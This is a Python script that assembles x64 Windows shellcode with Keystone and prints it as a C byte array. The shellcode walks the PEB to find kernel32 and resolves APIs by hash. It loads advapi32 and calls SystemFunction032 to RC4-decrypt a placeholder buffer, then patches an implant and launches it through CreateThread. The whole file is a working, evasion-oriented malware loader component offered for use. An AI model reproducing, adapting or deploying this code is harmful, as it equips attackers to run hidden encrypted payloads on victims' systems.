from keystone import *
import ctypes, struct

CODE = (
        " start: "
        " lea rax, [rip]; "
        " sub rax, 0x07;"
        " mov rbp, rsp ;" 
        " mov qword ptr [rbp+0xF8], rax;"
        " add rsp, 0xfffffffffffffdf0h ;" # Avoid NULL bytes

    " find_kernel32: " #
        " xor rcx, rcx ;" # rcx = 0
        " mov rsi,gs:[rcx+0x60] ;" # ESI = &(PEB) ([FS:0x60])
        " mov rsi,[rsi+0x18] ;" # ESI = PEB->Ldr
        " mov rsi,[rsi+0x30] ;" # ESI = PEB->Ldr.InInitOrder
    " next_module: " #
        " mov rbx, [rsi+0x10] ;" # rbx = InInitOrder[X].base_address
        " mov rdi, [rsi+0x40] ;" # EDI = InInitOrder[X].module_name
        " mov rsi, [rsi] ;" # ESI = InInitOrder[X].flink (next)
        " cmp [rdi+12*2], cx ;" # (unicode) modulename[12] == 0x00?
    " jne next_module ;" # No: try next module
    
    " find_function_shorten: " #
        " jmp find_function_shorten_bnc ;" # Short jump
    
    " find_function_ret: " #
        " pop rsi ;" # POP the return address from the stack
        " mov [rbp+0x08], rsi ;" # Save find_function address for later usage
        " jmp resolve_symbols_kernel32 ;" #

    " find_function_shorten_bnc: " #
        " call find_function_ret ;" # Relative CALL with negative offset

    " find_function: " #
        " push rsp ;"
        " push rax ;" # Save all registers
        " push rcx ;" # Save all registers
        " push rdx ;" # Save all registers
        " push rbx ;" # Save all registers
        " push rbp ;" # Save all registers
        " push rsi ;" # Save all registers
        " push rdi ;" # Save all registers
        " mov eax, [rbx+0x3c] ;" # Offset to PE Signature
        " mov edi, [rbx+rax+0x88] ;" # Export Table Directory RVA
        " add rdi, rbx ;" # Export Table Directory VMA
        " mov ecx, [rdi+0x14] ;" # NumberOfNames
        " xor rax, rax ;"
        " mov eax, [rdi+0x20] ;" # AddressOfNames RVA
        " add rax, rbx ;" # AddressOfNames VMA
        " mov [rbp-8], rax ;" # Save AddressOfNames VMA for later
        

    " find_function_loop: " #
        " jecxz find_function_finished ;" # Jump to the end if rcx is 0
        " dec rcx ;" # Decrement our names counter
        " mov rax, [rbp-8] ;" # Restore AddressOfNames VMA
        " mov esi, [rax+rcx*4] ;" # Get the RVA of the symbol name
        " add rsi, rbx ;"
        
    " compute_hash: " #
        " xor eax, eax ;" # NULL EAX
        " cdq ;" # NULL EDX
        " cld ;" # Clear direction

    " compute_hash_again: " #
        " lodsb ;" # Load the next byte from esi into al
        " test al, al ;" # Check for NULL terminator
        " jz compute_hash_finished ;" # If the ZF is set,we've hit the NULL term
        " ror edx, 0x0d ;" # Rotate edx 13 bits to the right
        " add edx, eax ;" # Add the new byte to the accumulator
        " jmp compute_hash_again ;" # Next iteration
        " compute_hash_finished: " #
        
        
        
    " find_function_compare: " #
        
        " cmp rdx, [rsp+0x48] ;" # Compare the computed hash with the requested hash
        " jnz find_function_loop ;" # If it doesn't match go back to find_function_loop
        " mov edx, [rdi+0x24] ;" # AddressOfNameOrdinals RVA
        " add rdx, rbx ;" # AddressOfNameOrdinals VMA
        " mov cx, [rdx+2*rcx] ;" # Extrapolate the function's ordinal
        " mov edx, [rdi+0x1c] ;" # AddressOfFunctions RVA
        " add rdx, rbx ;" # AddressOfFunctions VMA
        " mov eax, [rdx+4*rcx] ;" # Get the function RVA
        " add rax, rbx ;" # Get the function VMA
        " mov [rsp+0x30], rax;"
        
        
        
    " find_function_finished: " #
        
        " pop rdi ;" # Restore registers
        " pop rsi ;" # Restore registers
        " pop rbp ;" # Restore registers
        " pop rbx ;" # Restore registers
        " pop rdx ;" # Restore registers
        " pop rcx ;" # Restore registers
        " pop rax ;" # Restore registers
        " pop rsp ;" # Restore registers
        " ret ;" #
    " resolve_symbols_kernel32: "
        
        " mov rax, 0xca2bd06b; " # CreateThread hash
        " push rax; "
        " lea rax, [rip]; "
        " add rax, 0x0b;"
        " push rax; "
        " mov rax,[rbp+0x08]; "
        " push rax; "
        " ret; "
        " mov qword ptr [rbp+0x10], rax ;" # Save CreateThread address for later usage

        " mov rax, 0xd3324904;"
        " push rax; "
        " lea rax, [rip]; "
        " add rax, 0x0b;"
        " push rax; "
        " mov rax,[rbp+0x08]; "
        " push rax; "
        " ret; "
        " mov qword ptr [rbp+0x18], rax;" # GetModuleHandleA
       
        " mov rax, 0xFFFFFFFF83F20356;"
        " xor r8, r8; "
        " sub r8, rax; "
        " push r8;"
        " lea rax, [rip]; "
        " add rax, 0x0b;"
        " push rax; "
        " mov rax,[rbp+0x08]; "
        " push rax; "
        " ret; "
        " mov qword ptr [rbp+0x20], rax;" # GetProcAddress

        " mov rax, 0x30633ac; "
        " push rax; " # VirtualFree hash
        " lea rax, [rip]; "
        " add rax, 0x0b;"
        " push rax; "
        " mov rax,[rbp+0x08]; "
        " push rax; "
        " ret; "
        " mov qword ptr [rbp+0x48], rax ;" # Save VirtualFree address for later usage
  
         # WaitForSingleObject
        " mov rax, 0xFFFFFFFF31FA2653; "
        " xor r8, r8; "
        " sub r8, rax;"
        " push r8; " # WaitForSingleObject hash
        " call qword ptr [rbp+0x08] ;" # Call find_function
        " mov qword ptr [rbp+0x78], rax ;" # Save WaitForSingleObject address for later usage
        

    "exec_shellcode:"

        # Modify preimpant
        " mov r12, 0x4141414141414141; "
        " mov r8, r12; "
        " mov r9, r8; "
        " mov r8, [rbp+0xf8]; "
        " inc r9;"
        " inc r9;"
        " mov qword ptr [r9], r8; "
        " add r9, 0x0A; "
        " mov r8, [rbp+0x48];"
        " mov qword ptr [r9], r8; "
        " add r9, 0x0A; "
        " mov r8, [rbp+0x78];"
        " mov qword ptr [r9], r8;"
       
        # CreateThread
        " xor rcx, rcx; "
        " xor rdx, rdx; "
        " mov r8, r12; "
        " xor r9, r9; "
        " push rcx; "
        " push rcx; "
        " push r9; "
        " push r8;"
        " push rcx; "
        " push rcx; "
        " lea rbx, [rip]; "
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx,[rbp+0x10]; "
        " push rbx; "
        " ret; "
        #" add rsp, 0x08;"
        # GetModuleHandleA
        " mov rcx, 0x6c6c64746e; " # ntdll
        " push rcx; "
        " mov rcx, rsp; "
        " push rcx; "
        " lea rbx, [rip]; "
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx,  [rbp+0x18]; "
        " push rbx; "
        " ret; "
        " mov qword ptr [rbp+0x28], rax; "

        # GetProcAddress
        " mov rcx, [rbp+0x28]; "
        " mov rax, 0x6c6c;"
        " push rax;"
        " mov rax, 0x4464616f4c72644c;"
        " push rax;"

        " mov rdx, rsp; "
        " sub rsp, 0x20; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; "
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx,[rbp+0x20]; "
        " push rbx; "
        " ret; "
        " mov qword ptr [rbp+0x30], rax; "
        # LdrLoadDll
        " add rsp, 0x08;"
        
        " mov rax, 0x0032003300690070;" # advapi32
        " push rax;"
        " mov rax, 0x0061007600640061;"
        " push rax;"
        " push rsp; "
        " mov rcx, 0x12;"
        " shl rcx, 16;"
        " add rcx, 0x10; "
        " push rcx; "
        " mov r8, rsp; "
        " push rsp; "
        " mov r9, rsp; "
        " xor rcx, rcx; "
        " mov rdx, rcx; "
        " push r9; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; "
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx,[rbp+0x30]; "
        " push rbx; "
        " ret; "
        " mov rax, [rsp+0x20];"
        " sub rsp, 0x08; "
        # GetProcAddress
        " mov rcx, rax; "
        " mov rax, 0x32;" # SystemFunction032
        " push rax;"
        " mov rax, 0x33306e6f6974636e;" 
        " push rax;"
        " mov rax, 0x75466d6574737953;"
        " push rax;"
        " mov rdx, rsp; "
        " sub rsp, 0x20; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; "
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx,[rbp+0x20]; "
        " push rbx; "
        " ret; "
        " mov qword ptr [rbp+0x30], rax; "
        
        # data
        " mov rcx, 0x4242424242424242; " # buffer
        " mov rdx, 0x4343434343434343; " # size
        " push rcx;"
        " push rdx; "
        " mov qword ptr [rbp+0x38], rsp; "
        
        # key 
        " mov rax, 0x4444444444444444;" # key
        " push rax; "
        " mov rcx, rsp; "
        " mov rdx, 0x08; "
        " push rcx;"
        " push rdx; "
        " mov qword ptr [rbp+0x40], rsp; "
        
        # SystemFunction032
        " sub rsp, 0x08;"
        " mov rcx, [rbp+0x38];"
        " mov rdx, [rbp+0x40];"
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; "
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx,[rbp+0x30]; "
        " push rbx; "
        " ret; "
        

        

        
        
        # GetProcAddress
        " mov rcx, [rbp+0x28]; "
        " mov rax, 0x64;"
        " push rax;"
        " mov rax, 0x6165726854726573;" # RtlExitUserThread
        " push rax;"
        " mov rax, 0x55746978456c7452;"
        " push rax;"
        " mov rdx, rsp; "
        " sub rsp, 0x20; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; "
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx,[rbp+0x20]; "
        " push rbx; "
        " ret; "
        # RtlExitUserThread
        " xor rcx, rcx; "
        " push rcx; "
        " lea rbx, [rip]; "
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, rax; "
        " push rbx; "
        " ret; "
)
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
instructions = ""
i=1
for dec in encoding: 
    if(i % 20 == 0):
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
        instructions += "\"\r\n\""
    else:
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
    i+=1
print("unsigned char trampoline_shellcode[] = (\r\n\"" + instructions + "\");\r\n")



